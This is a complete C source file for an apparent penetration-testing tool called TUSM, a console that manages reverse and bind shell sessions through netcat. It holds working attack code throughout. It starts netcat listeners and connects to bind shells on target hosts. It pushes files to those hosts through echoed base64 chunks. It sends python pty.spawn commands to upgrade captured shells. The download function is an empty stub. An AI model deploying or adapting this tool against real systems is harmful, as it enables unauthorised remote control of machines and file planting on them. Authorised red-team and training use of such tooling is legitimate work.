/**
 * @file tusm.c
 * @brief TUSM - The Ultimate Shell Manager 
 *
 * This program manages bind and reverse shell sessions using netcat (nc).
 * The Doxygen comments were added to document the public API, structures and
 * functions to make automated documentation generation (e.g. HTML) easier.
 *
 * Features:
 *  - Listen for reverse shells
 *  - Connect to bind shells
 *  - Manage multiple sessions (list, kill, use, background, etc)
 *  - Upload files via base64
 *  - Upgrade remote shells to interactive PTYs
 *
 * Compile: gcc -o tusm main.c
 * Usage: ./tusm
 *
 * @author Abdullah, Abdulaziz
 * @version 1.0
 * @see https://github.com/TUKS-Project/TUS-Manager
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/wait.h>
 #include <signal.h>
 #include <fcntl.h>
 #include <time.h>
 #include <errno.h>
 
 /**
  * @def VERSION
  * @brief Program version string.
  */
 #define VERSION "1.0"
 
 /**
  * @def AUTHOR
  * @brief Author string used in banners.
  */
 #define AUTHOR "Abdullah, Abdulaziz"
 
 /**
  * @def URL
  * @brief Project repository URL.
  */
 #define URL "https://github.com/TUKS-Project/TUS-Manager"
 
 /**
  * @def MAX_SESSIONS
  * @brief Maximum number of concurrent sessions supported.
  */
 #define MAX_SESSIONS 20
 
 /**
  * @def BUFFER_SIZE
  * @brief Generic buffer size used for IO operations.
  */
 #define BUFFER_SIZE 4096
 
 /**
  * @struct Session
  * @brief Represents a managed shell session.
  *
  * Each session corresponds to a child process that runs netcat (nc). Two
  * pipes are stored for communicating with the child process: one for
  * writing commands to the child's stdin (in_pipe) and one for reading the
  * child's stdout/stderr (out_pipe).
  */
 struct Session {
     int id;               /**< Unique session id (1-based index). */
     pid_t pid;            /**< PID of the child process running nc. */
     char desc[128];       /**< Short textual description (e.g. "Listening on ..."). */
     char hostname[128];   /**< Optional hostname (not currently used). */
     int active;           /**< Non-zero if session is currently interactive. */
     int in_pipe[2];       /**< Pipe pair for sending commands to nc (parent writes to in_pipe[1]). */
     int out_pipe[2];      /**< Pipe pair for reading nc output (parent reads from out_pipe[0]). */
 };
 
 /**
  * @brief Global array storing active sessions.
  */
 struct Session sessions[MAX_SESSIONS];
 
 /**
  * @brief Current number of sessions in @c sessions.
  */
 int session_count = 0;
 
 /* ================== BASE64 ENCODER ================== */
 /**
  * @brief Base64 translation table used by base64_encode().
  */
 static const char b64_table[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 /**
  * @brief Encode a buffer into base64.
  *
  * This function allocates a new NUL-terminated string containing the base64
  * representation of the input buffer. The caller is responsible for calling
  * free() on the returned pointer. If @p out_len is non-NULL, it receives the
  * length of the encoded string (not including the terminating NUL).
  *
  * @param src Pointer to input bytes to be encoded.
  * @param len Length of the input buffer in bytes.
  * @param out_len Optional pointer to receive the length of the returned string.
  * @return Pointer to a malloc'd NUL-terminated base64 string on success,
  *         or NULL on error (allocation failure).
  */
 char *base64_encode(const unsigned char *src, size_t len, size_t *out_len) {
     char *out, *pos;
     const unsigned char *end, *in;
     size_t olen;
 
     olen = 4 * ((len + 2) / 3);
     if (olen < len) return NULL;
 
     out = malloc(olen + 1);
     if (!out) return NULL;
 
     end = src + len;
     in = src;
     pos = out;
 
     while (end - in >= 3) {
         *pos++ = b64_table[in[0] >> 2];
         *pos++ = b64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
         *pos++ = b64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
         *pos++ = b64_table[in[2] & 0x3f];
         in += 3;
     }
 
     if (end - in) {
         *pos++ = b64_table[in[0] >> 2];
         if (end - in == 1) {
             *pos++ = b64_table[(in[0] & 0x03) << 4];
             *pos++ = '=';
         } else {
             *pos++ = b64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
             *pos++ = b64_table[(in[1] & 0x0f) << 2];
         }
         *pos++ = '=';
     }
 
     *pos = '\0';
     if (out_len) *out_len = pos - out;
     return out;
 }
 
 // HELP
 /**
  * @brief Print the interactive help / command menu to stdout.
  *
  * This prints the top-level CLI commands and session commands available to the
  * user. The function writes ANSI color codes for readability in terminals.
  */
 void print_help(){
    printf("\033[1;33m");
    printf("\n CLI commands:\n");
    printf("  listen <port>          - Start a reverse shell listener\n");
    printf("  connect <ip> <port>    - Connect to a bind shell\n");
    printf("  list                   - List all sessions\n");
    printf("  use <id>               - Interact with a session\n");
    printf("  kill <id>              - Terminate a session\n");
    printf("  upload <id> <local> <remote> - Upload file\n");
    printf("  upgrade <id>           - Upgrade interactive shell (auto pty)\n");
    printf("  help                   - Command menu\n");
    printf("  clear                  - Clear screen\n");
    printf("  exit                   - Exit\n");
 
    printf("\n Session commands:\n");
    printf("  /BG                   - Return to menu, And send session to Background\n");
    printf("\033[0m\n\n");
 }
 
  /* ================== BANNER ================== */
 /**
  * @brief Print the ASCII art banner and program metadata.
  *
  * This prints the banner, version, author and then calls print_help().
  */
 void print_banner() {
     time_t now = time(NULL);
     struct tm *tm_struct = localtime(&now);
     char datetime[64];
     strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", tm_struct);
 
     printf("\033[1;31m");
     printf("████████╗██╗   ██╗███████╗███╗   ███╗\n");
     printf("╚══██╔══╝██║   ██║██╔════╝████╗ ████║\n");
     printf("   ██║   ██║   ██║███████╗██╔████╔██║\n");
     printf("   ██║   ██║   ██║╚════██║██║╚██╔╝██║\n");
     printf("   ██║   ╚██████╔╝███████║██║ ╚═╝ ██║\n");
     printf("   ╚═╝    ╚═════╝ ╚══════╝╚═╝     ╚═╝\n"); 
 
     printf("\033[1;34m");
     printf("═══════════════════════════════════\n");
 
     printf("\033[1;37m");
     printf("  The Ultimate Shell Manager\n");
 
     printf("\033[1;34m");
     printf("═══════════════════════════════════\n");
 
     printf("\033[0;36m");
     printf("Version: %s\n", VERSION);
     printf("Author : %s\n", AUTHOR);
     printf("GitHub: %s\n", URL);
 
     print_help();
 
     printf("\033[1;34m");
     printf("═══════════════════════════════════\n");
     printf("\033[0m");
     fflush(stdout);
 }
 
 
 
  /* ================== SESSION MANAGEMENT ================== */
 /**
  * @brief Add a new session to the global session list.
  *
  * This function registers the metadata and pipe file descriptors for a
  * newly-forked child process running netcat. It also sets the child's output
  * pipe to non-blocking mode so drains can use EAGAIN to detect end-of-data.
  *
  * @param pid Child process ID for the session.
  * @param desc Short textual description for the session.
  * @param in_pipe Array of two file descriptors for the input pipe.
  * @param out_pipe Array of two file descriptors for the output pipe.
  */
 void add_session(pid_t pid, const char *desc, int in_pipe[], int out_pipe[]) {
     if (session_count >= MAX_SESSIONS) {
         printf("[!] Session limit reached\n");
         return;
     }
     
     // Make output pipe non-blocking
     int flags = fcntl(out_pipe[0], F_GETFL, 0);
     fcntl(out_pipe[0], F_SETFL, flags | O_NONBLOCK);
     
     sessions[session_count].id = session_count + 1;
     sessions[session_count].pid = pid;
     strncpy(sessions[session_count].desc, desc, sizeof(sessions[session_count].desc) - 1);
     sessions[session_count].desc[sizeof(sessions[session_count].desc) - 1] = '\0';
     sessions[session_count].active = 0;
 
     sessions[session_count].in_pipe[0] = in_pipe[0];
     sessions[session_count].in_pipe[1] = in_pipe[1];
     sessions[session_count].out_pipe[0] = out_pipe[0];
     sessions[session_count].out_pipe[1] = out_pipe[1];
 
     session_count++;
 }
 
 /**
  * @brief Print a list of current sessions to stdout.
  *
  * Displays each session's ID, PID, status (active/background) and
  * description in a simple table.
  */
 void list_sessions() {
     if (session_count == 0) {
         printf("[*] No active sessions\n");
         return;
     }
     printf("\033[1;36m");
     printf("ID  PID      STATUS      DESCRIPTION\n");
     printf("--- -------- ----------- -----------\n");
     printf("\033[0m");
     for (int i = 0; i < session_count; i++) {
         printf("%-3d %-8d %-11s %s\n", 
                sessions[i].id, 
                sessions[i].pid,
                sessions[i].active ? "active" : "background",
                sessions[i].desc);
     }
 }
 
 /**
  * @brief Terminate and remove a session by id.
  *
  * Sends SIGTERM to the child, waits for it to exit, closes pipes and removes
  * the session entry from the sessions array.
  *
  * @param id 1-based session id to kill.
  */
 void kill_session(int id) {
     for (int i = 0; i < session_count; i++) {
         if (sessions[i].id == id) {
             kill(sessions[i].pid, SIGTERM);
             waitpid(sessions[i].pid, NULL, 0);
 
             close(sessions[i].in_pipe[0]);
             close(sessions[i].in_pipe[1]);
             close(sessions[i].out_pipe[0]);
             close(sessions[i].out_pipe[1]);
 
             printf("[*] Session %d killed\n", id);
 
             for (int j = i; j < session_count - 1; j++) {
                 sessions[j] = sessions[j + 1];
             }
             session_count--;
             return;
         }
     }
     printf("[!] Invalid session ID\n");
 }
 
  /* ================== IMPROVED OUTPUT DRAINING ================== */
 /**
  * @brief Read and print available output from a session's output pipe.
  *
  * This function repeatedly reads from the session's out_pipe[0] until the
  * pipe would block (EAGAIN/EWOULDBLOCK) or EOF is reached. Any data read is
  * printed to stdout. On EOF or error the function returns -1, otherwise it
  * returns the total number of bytes read during this call.
  *
  * @param session_idx Index (0-based) into the global sessions array.
  * @return Number of bytes read (>0) on success, 0 if no data available, or -1
  *         if the session closed or an unrecoverable error occurred.
  */
 int drain_output(int session_idx) {
     char buffer[BUFFER_SIZE];
     int total_bytes = 0;
     
     while (1) {
         int bytes_read = read(sessions[session_idx].out_pipe[0], buffer, BUFFER_SIZE - 1);
         if (bytes_read > 0) {
             buffer[bytes_read] = '\0';
             printf("%s", buffer);
             fflush(stdout);
             total_bytes += bytes_read;
         } else if (bytes_read == 0) {
             // EOF - session closed
             return -1;
         } else {
             // EAGAIN/EWOULDBLOCK or other error
             if (errno == EAGAIN || errno == EWOULDBLOCK) {
                 break; // No more data available
             } else {
                 perror("read");
                 return -1;
             }
         }
     }
     return total_bytes;
 }
 
 
  /* ================== UPLOAD FILE ================== */
 /**
  * @brief Upload a local file to a remote session by sending base64 chunks.
  *
  * The function reads the @p local_path file in fixed-size chunks, base64
  * encodes each chunk and appends it to a temporary file on the remote side
  * (named `uplaodtmp.tusm` in the remote working directory). When finished it
  * assembles the remote file by base64-decoding the temporary file into
  * @p remote_name.
  *
  * @note This function assumes the remote end runs a POSIX shell and has
  *       `base64` available. The temporary filename is fixed and may collide
  *       with other concurrent uploads on the remote host.
  *
  * @param id 1-based session id to which data should be uploaded.
  * @param local_path Path to the local file to send.
  * @param remote_name Destination path/name on the remote filesystem.
  */
 void upload_file(int id, const char *local_path, const char *remote_name) {
   if (id <= 0 || id > session_count) {
       printf("[!] Invalid session ID\n");
       return;
   }
 
   FILE *fp = fopen(local_path, "rb");
   if (!fp) {
       perror("fopen");
       return;
   }
 
   unsigned char buffer[512];
   size_t n;
   char command[BUFFER_SIZE];
 
   snprintf(command, sizeof(command), "rm -f uplaodtmp.tusm\n");
   write(sessions[id - 1].in_pipe[1], command, strlen(command));
 
   while ((n = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
       size_t out_len;
       char *encoded = base64_encode(buffer, n, &out_len);
       if (!encoded) {
           printf("[!] base64_encode failed\n");
           fclose(fp);
           return;
       }
 
       snprintf(command, sizeof(command), "echo \"%s\" >> uplaodtmp.tusm\n",
                encoded);
       write(sessions[id - 1].in_pipe[1], command, strlen(command));
       free(encoded);
   }
 
   fclose(fp);
 
   snprintf(command, sizeof(command),
            "cat uplaodtmp.tusm | base64 -d > %s\n", remote_name);
   write(sessions[id - 1].in_pipe[1], command, strlen(command));
 
   printf("[*] File %s uploaded to session %d as %s\n", local_path, id,
          remote_name);
 }
 
 
 /**
  * @brief Request a remote file be base64-printed so the operator can download it.
  *
  * The function sends a command to the remote shell to base64-encode the
  * specified @p remote_path and prints a hint on how to decode the data locally.
  * The actual base64 payload will appear in the session output which the user
  * can capture and decode locally.
  *
  * @param id 1-based session id to request the remote file from.
  * @param remote_path Path to the file on the remote host.
  * @param local_name Suggested filename to use when decoding locally.
  */
 void download_file(int id, const char *remote_path, const char *local_name) {
   
 }
 
  /* ================== AUTO PTY SHELL ================== */
 /**
  * @brief Attempt to upgrade a remote shell into an interactive PTY.
  *
  * Several methods are attempted (python3/python/`script` and fallback to
  * /bin/bash). This sends the appropriate commands to the specified session
  * so the remote side can spawn a PTY-backed shell and set TERM.
  *
  * @param id 1-based session id to upgrade.
  */
 void upgrade(int id) {
     if (id <= 0 || id > session_count) {
         printf("[!] Invalid session ID\n");
         return;
     }
 
     char command[BUFFER_SIZE];
     
     printf("[*] Attempting to spawn interactive shell on session %d...\n", id);
     
     // Try multiple methods to get a proper PTY
     snprintf(command, sizeof(command), 
              "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || "
              "python -c 'import pty; pty.spawn(\"/bin/bash\")' || "
              "script -qc /bin/bash /dev/null || "
              "/bin/bash\n");
     
     write(sessions[id - 1].in_pipe[1], command, strlen(command));
     
     // Try to set up proper terminal
     snprintf(command, sizeof(command), "export TERM=xterm\n");
     write(sessions[id - 1].in_pipe[1], command, strlen(command));
     
     printf("[*] Interactive shell commands sent. Use 'use %d' to interact.\n", id);
 }
 
  
 
  /* Remove a session at index idx (0-based). Closes pipes and reindexes array. */
 /**
  * @brief Remove and cleanup a session by array index (0-based).
  *
  * This function attempts to terminate the child process (if running), closes
  * any pipe file descriptors and removes the session entry from the global
  * array, shifting remaining entries to keep the array compact.
  *
  * @param idx Index into the sessions array (0-based).
  */
 void remove_session_at_index(int idx) {
     if (idx < 0 || idx >= session_count) return;
 
     // Try to terminate child if still running
     if (sessions[idx].pid > 0) {
         kill(sessions[idx].pid, SIGTERM);
         waitpid(sessions[idx].pid, NULL, WNOHANG);
     }
 
     // Close pipes (ignore errors)
     if (sessions[idx].in_pipe[0] > 0) close(sessions[idx].in_pipe[0]);
     if (sessions[idx].in_pipe[1] > 0) close(sessions[idx].in_pipe[1]);
     if (sessions[idx].out_pipe[0] > 0) close(sessions[idx].out_pipe[0]);
     if (sessions[idx].out_pipe[1] > 0) close(sessions[idx].out_pipe[1]);
 
     // Shift array left
     for (int j = idx; j < session_count - 1; j++) {
         sessions[j] = sessions[j + 1];
     }
     session_count--;
 }
 
 /**
  * @brief Poll all sessions to detect terminated child processes.
  *
  * This walks the sessions array and calls waitpid(..., WNOHANG) for each
  * child. If a child has exited the session is cleaned up via
  * remove_session_at_index(). The function is non-blocking and intended to be
  * called periodically from the main loop.
  */
 void check_sessions() {
     for (int i = 0; i < session_count; /* increment inside */) {
         pid_t pid = sessions[i].pid;
         if (pid <= 0) { i++; continue; }
 
         int status = 0;
         pid_t w = waitpid(pid, &status, WNOHANG);
         if (w == 0) {
             // child still running
             i++;
             continue;
         } else if (w == pid) {
             // child exited
             printf("\n[*] Session %d (PID %d) terminated.\n", sessions[i].id, pid);
             remove_session_at_index(i);
             // Do not increment i — array shifted, current i is next element
         } else {
             // waitpid error (ECHILD or other) - remove conservative
             if (errno != ECHILD) {
                 perror("waitpid");
             }
             remove_session_at_index(i);
         }
     }
 }
 
  /* ================== IMPROVED INTERACT SESSION ================== */
 /**
  * @brief Interact with a session in a pseudo-terminal loop.
  *
  * The function monitors STDIN and the session's output pipe using select()
  * and forwards data to/from the remote process. Typing the command "/BG"
  * backgrounds the session and returns control to the main menu.
  *
  * @param id 1-based session id to interact with.
  */
 void interact_session(int id) {
     int session_idx = -1;
     
     // Find session
     for (int i = 0; i < session_count; i++) {
         if (sessions[i].id == id) {
             session_idx = i;
             break;
         }
     }
     
     if (session_idx == -1) {
         printf("[!] Invalid session ID\n");
         return;
     }
 
     printf("[*] Interacting with session %d (type '/BG' to background)\n", id);
     sessions[session_idx].active = 1;
 
     char input[BUFFER_SIZE];
     fd_set readfds;
     int max_fd;
 
     // Initial drain of any pending output
     drain_output(session_idx);
 
     while (1) {  
         fflush(stdout);
        
         // Use select to monitor both stdin and session output
         FD_ZERO(&readfds);
         FD_SET(STDIN_FILENO, &readfds);
         FD_SET(sessions[session_idx].out_pipe[0], &readfds);
         
         max_fd = (sessions[session_idx].out_pipe[0] > STDIN_FILENO) ? 
                  sessions[session_idx].out_pipe[0] : STDIN_FILENO;
 
         int ready = select(max_fd + 1, &readfds, NULL, NULL, NULL);
         
         if (ready < 0) {
             if (errno == EINTR) continue;
             perror("select");
             break;
         }
        
 
         // Check for output from session
         if (FD_ISSET(sessions[session_idx].out_pipe[0], &readfds)) {
             int result = drain_output(session_idx);
             if (result < 0) {
                 printf("\n[*] Session %d closed.\n", id);
                 remove_session_at_index(session_idx);
                 return;
             }
         }
 
         // Check for input from user
         if (FD_ISSET(STDIN_FILENO, &readfds)) {
             if (!fgets(input, sizeof(input), stdin)) {
                 printf("\n[*] Input closed. Returning to main menu.\n");
                 sessions[session_idx].active = 0;
                 return;
             }
 
             // Remove newline
             input[strcspn(input, "\n")] = 0;
 
             if (strcmp(input, "/BG") == 0) {
                 printf("[*] Session %d sent to background\n", id);
                 sessions[session_idx].active = 0;
                 return;
             }
             else if (strcmp(input, "clear") == 0) {
                system("clear");
            }
 
             // Send command
             strcat(input, "\n");
             if (write(sessions[session_idx].in_pipe[1], input, strlen(input)) < 0) {
                 perror("write");
                 printf("[*] Failed to write to session %d. Removing.\n", id);
                 remove_session_at_index(session_idx);
                 return;
             }
 
             // Give a moment for output, then drain
             usleep(50000); // 50ms
             drain_output(session_idx);
         }
     }
     
     sessions[session_idx].active = 0;
 }
 
  /* ================== LISTENER/CONNECT ================== */
 /**
  * @brief Start a netcat listener on the specified port and register a session.
  *
  * This function forks a child process that execs `nc -lnp <port>` and sets up
  * two pipes for communication. The newly created session is added to the
  * global list via add_session().
  *
  * @param port Port number string to listen on (as passed to nc).
  */
 void start_listener(const char *port) {
     int in_pipe[2];
     int out_pipe[2];
 
     if (pipe(in_pipe) < 0 || pipe(out_pipe) < 0) {
         perror("pipe");
         return;
     }
 
     pid_t pid = fork();
     if (pid == 0) {
         dup2(in_pipe[0], STDIN_FILENO);
         dup2(out_pipe[1], STDOUT_FILENO);
         dup2(out_pipe[1], STDERR_FILENO);
 
         close(in_pipe[1]);
         close(out_pipe[0]);
 
         execlp("nc", "nc", "-lnp", port, NULL);
         perror("execlp");
         exit(1);
     } else if (pid > 0) {
         close(in_pipe[0]);
         close(out_pipe[1]);
 
         char desc[128];
         snprintf(desc, sizeof(desc), "Listening on port %s", port);
         add_session(pid, desc, in_pipe, out_pipe);
         printf("[*] Listener started on port %s [session %d]\n", port, session_count);
     } else {
         perror("fork");
     }
 }
 
 /**
  * @brief Connect to a remote bind shell using netcat and register a session.
  *
  * This function forks a child process that execs `nc <ip> <port>` and
  * prepares pipes for communicating with the remote endpoint.
  *
  * @param ip IP address or hostname to connect to.
  * @param port Port number string to connect to.
  */
 void connect_target(const char *ip, const char *port) {
     int in_pipe[2];
     int out_pipe[2];
 
     if (pipe(in_pipe) < 0 || pipe(out_pipe) < 0) {
         perror("pipe");
         return;
     }
 
     pid_t pid = fork();
     if (pid == 0) {
         dup2(in_pipe[0], STDIN_FILENO);
         dup2(out_pipe[1], STDOUT_FILENO);
         dup2(out_pipe[1], STDERR_FILENO);
 
         close(in_pipe[1]);
         close(out_pipe[0]);
 
         execlp("nc", "nc", ip, port, NULL);
         perror("execlp");
         exit(1);
     } else if (pid > 0) {
         close(in_pipe[0]);
         close(out_pipe[1]);
 
         char desc[128];
         snprintf(desc, sizeof(desc), "Connected to %s:%s", ip, port);
         add_session(pid, desc, in_pipe, out_pipe);
         printf("[*] Connected to %s:%s [session %d]\n", ip, port, session_count);
     } else {
         perror("fork");
     }
 }
 
 static void ensure_rlwrap(int argc, char **argv) {
    /* If already wrapped (or user forced skip) -> do nothing */
    if (getenv("TUSM_RLWRAPPED") != NULL) return;
 
    /* Build new argv: {"rlwrap", argv[0], argv[1], ..., NULL} */
    char **newargv = malloc((argc + 2) * sizeof(char *));
    if (!newargv) return;
 
    newargv[0] = "rlwrap";
    for (int i = 0; i < argc; ++i) {
        newargv[i + 1] = argv[i];
    }
    newargv[argc + 1] = NULL;
 
    /* Mark environment so the child won't try to re-wrap again */
    if (setenv("TUSM_RLWRAPPED", "1", 1) != 0) {
        free(newargv);
        return;
    }
 
    /* Replace current process with: rlwrap original-argv... */
    execvp("rlwrap", newargv);
 
    /* If execvp returns, it failed. Clean up and continue without rlwrap. */
    int saved_errno = errno;
    unsetenv("TUSM_RLWRAPPED");
    free(newargv);
 
    /* If rlwrap is simply not installed, silently continue.
       Otherwise print a diagnostic (optional). */
    if (saved_errno != ENOENT && saved_errno != ENOEXEC && saved_errno != ENOTDIR) {
        perror("execvp(rlwrap)");
    }
    /* return to main and continue without rlwrap */
 }
 
 
  /* ================== MAIN LOOP ================== */
 /**
  * @brief Program entry point and interactive command loop.
  *
  * The main function optionally re-execs itself under rlwrap for readline-like
  * editing, prints the banner, and enters a simple REPL accepting commands
  * such as "listen", "connect", "list", "use", "upload",
  * "upgrade" and "kill". Periodically check_sessions() is used to reap
  * terminated child processes.
  *
  * @param argc Argument count as passed to the program.
  * @param argv Argument vector as passed to the program.
  * @return Returns 0 on normal exit.
  */

  int main(int argc, char **argv) {
    /* Try to auto-wrap with rlwrap (will exec and not return if successful) */
    ensure_rlwrap(argc, argv);
    char input[256];

    system("clear");
    print_banner();
    
    while (1) {
        // Check sessions each loop
        check_sessions();

        printf("\033[1;36mTUSM>\033[0m "); // Cyan bold prompt
        fflush(stdout);

        if (!fgets(input, sizeof(input), stdin)) break;
        input[strcspn(input, "\n")] = 0;

        if (strncmp(input, "listen", 6) == 0) {
            char port[16];
            if (sscanf(input, "listen %15s", port) == 1) {
                start_listener(port);
            } else {
                printf("\033[1;33m[!] Usage: listen <port>\033[0m\n");
            }
        } else if (strncmp(input, "connect", 7) == 0) {
            char ip[64], port[16];
            if (sscanf(input, "connect %63s %15s", ip, port) == 2) {
                connect_target(ip, port);
            } else {
                printf("\033[1;33m[!] Usage: connect <ip> <port>\033[0m\n");
            }
        } else if (strcmp(input, "list") == 0) {
            list_sessions();
        } else if (strcmp(input, "/BG") == 0) {
            printf("\033[1;31m[!] This command should be used inside a session!\033[0m\n");
            printf("\033[1;33m[!] Use \"use <id>\" to enter a session!\033[0m\n");
        } else if (strcmp(input, "help") == 0) {
            print_help();
        } else if (strcmp(input, "clear") == 0) {
            system("clear");
        } else if (strncmp(input, "kill", 4) == 0) {
            int id;
            if (sscanf(input, "kill %d", &id) == 1) {
                kill_session(id);
            } else {
                printf("\033[1;33m[!] Usage: kill <id>\033[0m\n");
            }
        } else if (strncmp(input, "use", 3) == 0) {
            int id;
            if (sscanf(input, "use %d", &id) == 1) {
                interact_session(id);
            } else {
                printf("\033[1;33m[!] Usage: use <id>\033[0m\n");
            }
        } else if (strncmp(input, "upload", 6) == 0) {
            int id;
            char local[128], remote[128];
            if (sscanf(input, "upload %d %127s %127s", &id, local, remote) == 3) {
                upload_file(id, local, remote);
            } else {
                printf("\033[1;33m[!] Usage: upload <id> <localfile> <remotefile>\033[0m\n");
            }
        } else if (strncmp(input, "upgrade", 7) == 0) {
            int id;
            if (sscanf(input, "upgrade %d", &id) == 1) {
                upgrade(id);
            } else {
                printf("\033[1;33m[!] Usage: upgrade <id>\033[0m\n");
            }
        } else if (strcmp(input, "exit") == 0 || strcmp(input, "quit") == 0) {
            printf("\033[1;36m[*] Cleaning up sessions...\033[0m\n");
            for (int i = 0; i < session_count; i++) {
                kill(sessions[i].pid, SIGTERM);
                waitpid(sessions[i].pid, NULL, WNOHANG);
            }
            printf("\033[1;35m[*] Exiting...\033[0m\n");
            break;
        } else if (strlen(input) > 0) {
            printf("\033[1;31m[!] Unknown command: %s\033[0m\n", input);
            printf("\033[1;33m[!] Use \"help\" to print command menu.\033[0m\n\n");
        }
    }
    return 0;
}
